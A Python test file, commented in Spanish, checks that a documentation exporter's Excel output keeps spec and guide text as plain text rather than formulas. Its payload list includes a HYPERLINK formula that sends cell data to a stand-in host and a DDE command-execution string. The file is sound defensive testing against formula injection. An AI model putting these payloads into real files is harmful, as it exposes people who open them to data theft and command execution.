"""Revisión de seguridad F4 (HU 4.10 parte 2): el Excel exportado no ejecuta fórmulas que vengan de specs o guías."""

import io
import json

import pytest
from apoyo_exportes import ATLAS
from openpyxl import load_workbook

from atlas_docs.exportes import Formato, PaqueteExportar, exportar

FORMULA = '=HYPERLINK("https://x.ejemplo.com/?d="&A1,"Ver detalle")'

# Lo que una hoja de cálculo puede tomar como fórmula o comando al inicio de una celda (OWASP, CSV/Formula Injection).
PELIGROSOS = [
    FORMULA,
    "+1+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1,1)",
    "\t=1+1",
    "\r=1+1",
]


def _paquete_con_formula(valor: str = FORMULA) -> PaqueteExportar:
    return PaqueteExportar.model_validate(
        {
            "metadatos": {
                "paquete": "Paquete Demo",
                "revision": 1,
                "organizacion": "Organismo Demo",
                "fecha": "2026-10-24",
                "changelog": [{"revision": "1", "fecha": "2026-10-24", "cambio": valor}],
            },
            "specs": [
                {"contrato": "atlas", "version": "1.0.0", "contenido": ATLAS.read_text(encoding="utf-8")},
                {"contrato": "demo", "version": "1.0.0", "contenido": _spec_con(valor)},
            ],
            "guias": [{"titulo": "Guía Demo", "markdown": valor}],
        }
    )


def _spec_con(valor: str) -> str:
    """Un OpenAPI mínimo con el valor en la descripción, un campo, un enum y un ejemplo."""
    return json.dumps(
        {
            "openapi": "3.1.0",
            "info": {"title": "API Demo", "version": "1.0.0", "description": valor},
            "paths": {
                "/tramites": {
                    "post": {
                        "summary": valor,
                        "description": valor,
                        "requestBody": {
                            "content": {
                                "application/json": {
                                    "schema": {"$ref": "#/components/schemas/Tramite"},
                                    "example": {"placa": valor},
                                }
                            }
                        },
                        "responses": {"200": {"description": valor}},
                    }
                }
            },
            "components": {
                "schemas": {
                    "Tramite": {
                        "type": "object",
                        "properties": {
                            "placa": {"type": "string", "description": valor},
                            "tipo": {"$ref": "#/components/schemas/Tipo"},
                        },
                    },
                    "Tipo": {"type": "string", "enum": [valor], "x-enum-descriptions": [valor]},
                }
            },
        }
    )


def _libro(valor: str):
    resultado = exportar(_paquete_con_formula(valor), {Formato.EXCEL})
    (archivo,) = resultado.por_formato(Formato.EXCEL)
    return load_workbook(io.BytesIO(archivo.datos))


@pytest.mark.parametrize("valor", PELIGROSOS)
def test_ninguna_celda_del_excel_es_una_formula(valor: str) -> None:
    libro = _libro(valor)
    celdas = [
        celda for hoja in libro.worksheets for fila in hoja.iter_rows() for celda in fila if celda.value is not None
    ]
    formulas = [f"{celda.parent.title}!{celda.coordinate}" for celda in celdas if celda.data_type == "f"]
    assert formulas == []
    no_texto = [f"{celda.parent.title}!{celda.coordinate}" for celda in celdas if celda.data_type != "s"]
    assert no_texto == []
    # El valor llega tal cual (como texto) a alguna celda: no se pierde ni se reescribe.
    assert any(valor.strip() in str(celda.value) for celda in celdas)
